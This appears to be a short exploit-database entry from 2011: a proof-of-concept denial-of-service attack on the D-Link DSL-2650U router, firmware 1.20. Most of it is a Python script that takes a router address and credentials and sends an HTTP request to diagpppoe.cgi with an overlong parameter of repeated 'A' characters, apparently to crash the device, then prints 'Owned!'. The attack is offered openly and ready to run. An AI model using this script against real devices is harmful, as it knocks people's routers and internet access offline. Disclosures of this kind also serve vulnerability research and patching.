# Exploit Title: Dlink DSL-2650U DoS/PoC
# Date: July 6th, 2011
# Author: Li'el Fridman
# Software Link:
ftp://ftp.dlink.ru/pub/ADSL/DSL-2650U_BRU_D/Firmware/RU_1.20/DSL-2650U_BRU_D1_RU_1.20_06222011.zip
# Version: 1.20
# Tested on: Default firmware - Linux 2.6.8.1

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import os
import urllib

ip = raw_input('Please enter the router address: ')
username = raw_input('Please enter the router user name: ')
password = raw_input('Please enter the router password: ')
path = 'http://{0}:{1}@{2}/diagpppoe.cgi?diagPrev=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.format(username, password, ip)
print 'Trying {0}'.format(path)
opener = urllib.urlopen(path)
print 'Owned!'